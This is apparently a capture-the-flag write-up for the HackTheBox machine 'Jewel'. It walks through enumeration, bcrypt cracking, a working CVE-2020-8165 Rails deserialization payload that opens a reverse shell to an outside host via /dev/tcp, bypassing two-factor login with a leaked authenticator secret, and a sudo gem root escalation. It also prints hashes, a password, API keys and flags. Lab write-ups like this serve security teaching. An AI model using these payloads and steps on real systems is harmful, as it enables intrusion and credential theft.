# Jewel

export IP=10.10.10.211

# Solution

Starting with a simple nmap scan
```
cmd: nmap -sC -sV -oN nmap/initial $IP -Pn

22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 10.10.10.211 Git
|_Requested resource was http://10.10.10.211:8000/gitweb/
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets do an all port on the side... UPDATE: same results<br>

add the jewel.htb to <b> /etc/hosts </b> <br>

We have a repository directory on port 8000, lets check it <br>

```
Project: .git
Description: BLOG!
```

This is what is running in the port 8080 (maybe running directly) <br>

Looking around we can find some hashes for the users
```
File:.git/bd.sql

username: bill
email: bill@mail.htb
hash: $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW

username: jennifer
email: jennifer@mail.htb
hash: $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
```

The hashtype is: <b> bcrypt, blowfish</b> (src: https://hashes.com/en/tools/hash_identifier)

```
mode: 3200 (bcrypt)
cmd: hashcat -a 0 -m 3200 hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

So i let it run for half an hour and it did not found anything. Needed to cancel it because the estimated time to finish was 9 days...<br>

Lets fuzz the pages ! <br>

```
PORT 8080

cmd: ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://$IP:8080/FUZZ -o fuzz/big.8080.log

articles                [Status: 200, Size: 3446, Words: 477, Lines: 86]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
login                   [Status: 200, Size: 2652, Words: 245, Lines: 62]
robots.txt              [Status: 200, Size: 98, Words: 12, Lines: 2]
signup                  [Status: 200, Size: 2800, Words: 261, Lines: 68]
```

```
PORT 8000

cmd: ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://$IP:8000/FUZZ -o fuzz/big.8000.log

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
cgi-bin/                [Status: 403, Size: 279, Words: 20, Lines: 10]
gitweb                  [Status: 301, Size: 320, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10
```

From the main page on the blog we can see a post from jennifer.. Lets try to generate her password from it
```
cmd: cewl -m 5 http://$IP:8080/articles/11 > guess.txt

wc -l guess.txt
151 guess.txt
```

Now lets try to brute force with burp... Nothing found... lets enum a bit more manually... <br>

From the requests to the port 8080 we have

```
X-Powered-By: Phusion Passenger 6.0.6
Server: nginx/1.14.2 + Phusion Passenger 6.0.6
```

No vulnerabilities found for that versions <br>

From the git folder, we can already see that it uses the CGI to run rails probably
```
-rw-r--r-- 	2365 	Gemfile 	blob | history | raw
-rw-r--r-- 	5982 	Gemfile.lock 	blob | history | raw
```

Lets check the version by searching in the files (there is a functionality to search with grep)... 
```
ruby '2.5.5'
'rails', '5.2.2.1'
```

There were multiple versions disclosed, i picked the latest in each search <br>

There's a CVE for a version above 
- code: CVE-2020-8165
- Description: A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE. 
- POC: https://github.com/masahiro331/CVE-2020-8165


```
code = '`/bin/bash/ -c "bash -i >& /dev/tcp/10.10.14.182/1414 0>&1"`'
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
require 'uri'
puts URI.encode_www_form(payload: payload)
```

Since the vulnerability resides in the mode the cache is fetch (raw), we can check in the git repo page (using the grep functionality) that it is used on user account changes... we can change the user name, so thats the form we are targeting!!!
```

File: /app/controllers/users_controller.rb

Line: @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
```

The generated payload is
```
%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%40%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.182%2F1414+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
```


Now we need to change the request (i used burp to do that, using curl with post methods just takes more time and im a lazy mf)... <br>

Steps:
- capture normal name change request
- modify
- send
- launch listener
- reload any page that contain the name

in the end, the burp request must be in the following format
```
(...) username%5D=(PAYLOAD_HERE) (...)
```


And voila, we got a shell !!! 
```
whoami && id

bill
uid=1000(bill) gid=1000(bill) groups=1000(bill)

cat ~/user.txt
FLAG: c6523480eab1d5654aec10b079eda5d8
```

just to have some persistence, i'll create an ssh key so i can ssh at any time (if the machine is not reseted)... <br>

interesting things on automated enumeration
```

~/.google_authenticator (?!?!?!)

Sudo version 1.8.27

Open ports
35401
6379
5432

-rwsr-xr-- 1 root messagebus 51184 Jul  5 17:10 /usr/lib/dbus-1.0/dbus-daemon-launch-helper



root       732  0.0  0.3 304880 13188 ?        Ssl  17:38   0:00 Passenger watchdog
root       819  0.0  0.0  71616  2084 ?        Ss   17:38   0:00 nginx: master process /usr/sbin/nginx -g

https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/proc/sys/kernel/yama/ptrace_scope is enabled (0)

/var/lib/gems/2.5.0/gems/mini_mime-1.0.2/lib/db/content_type_mime.db: ASCII text
Found: /var/lib/gems/2.5.0/gems/mini_mime-1.0.2/lib/db/ext_mime.db:

-rwsr-xr-x 1 root root        24K Jul 12 12:08 /usr/lib/chromium/chrome-sandbox

/home/bill/.gnupg/trustdb.gpg
/home/bill/.gnupg/pubring.kbx
/tmp/passenger.4U05Tyz/creation_finalized
/tmp/passenger.4U05Tyz/core.pid
/tmp/passenger.4U05Tyz/full_admin_password.txt
/tmp/passenger.4U05Tyz/web_server_info/control_process.pid
/tmp/passenger.4U05Tyz/lock
/tmp/passenger.4U05Tyz/watchdog.pid
/tmp/passenger.4U05Tyz/properties.json
/tmp/passenger.4U05Tyz/read_only_admin_password.txt
/var/lib/gems/2.5.0/gems/ffi-1.13.1/ext/ffi_c/libffi/ChangeLog.old

/usr/share/rubygems-integration/all/gems/railties-5.2.2.1/lib/rails/commands/credentials
/usr/share/rubygems-integration/all/gems/railties-5.2.2.1/lib/rails/generators/rails/credentials

/etc/chromium.d/apikeys:export GOOGLE_API_KEY="AIzaSyCkfPOPZXDKNn8hhgu3JrA62wIgC93d44k"
/etc/chromium.d/apikeys:export GOOGLE_DEFAULT_CLIENT_ID="811574891467.apps.googleusercontent.com"
/etc/chromium.d/apikeys:export GOOGLE_DEFAULT_CLIENT_SECRET="kdloedMFGdGla2P1zacGjAQh"

/var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW

```

Two more hashes
```
jennifer jennifer@mail.htb $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
bill	 bill@mail.htb	   $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
```

Since i found so many hashes i decided to use a smaller rockyou wordlists (the other had 14Million records)... <br>

And i found one hash
```
bill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob
```

The password is accepted... but it needs a verification code ! (since i found the password i stopped the cracking)<br>

I've found a google_authenticator file in bill' home folder... Maybe its a two-factor authenticator (src:https://wiki.archlinux.org/index.php/Google_Authenticator)<br>

```
cat ~/.google_authenticator 

2UQI3R52WFCLE6JTLDCSJYMJH4 <- API KEY???
" WINDOW_SIZE 17
" TOTP_AUTH
```

To test this out i searched for a browser extension and found one <br>

It gives me codes but i keep getting an error
```
Error "Operation not permitted" while writing config
```

I couldnt figure out so i went and checked the forum
```
For those stuck at the priv esc with the error, think about what you're using. Its hard to communicate when you're out of sync with each other.
```

Since the tokens (codes) expire based on time, the clock difference between my machine and the htb machine may be causing this issue... <br>

```
SSH-SHELL
################################
cmd: timedatectl
Local time: Thu 2020-11-26 21:40:22 GMT
           Universal time: Thu 2020-11-26 21:40:22 UTC
                 RTC time: Thu 2020-11-26 21:40:22
                Time zone: Europe/London (GMT, +0000)

----------------------------[]
LH-SHELL
################################
cmd: timedatectl
               Local time: qui 2020-11-26 21:33:09 WET
           Universal time: qui 2020-11-26 21:33:09 UTC
                 RTC time: qui 2020-11-26 21:33:09    
                Time zone: Europe/Lisbon (WET, +0000) 
```

So it was clear that the token was expired for the ssh shell ... <br>

So i changed my timezone and the time to match almost perfectly
```
cmd: timedatectl --help

set-time TIME            Set system time
set-timezone ZONE        Set system time zone


cmd: timedatectl set-timezone Europe/London
cmd: timedatectl set-time 21:45:54
```

Went to the ssh shell and issued one more time
```
sudo -l
Password: spongebob
Verification code: 728528

Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem

```

From gtfo bins directly to you (src: https://gtfobins.github.io/gtfobins/gem/)
```
sudo gem open -e "/bin/bash -c /bin/bash" rdoc

whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

cat ~/root.txt
FLAG:b00acaf2a5004307c5e650c8a0dc3ff2
```


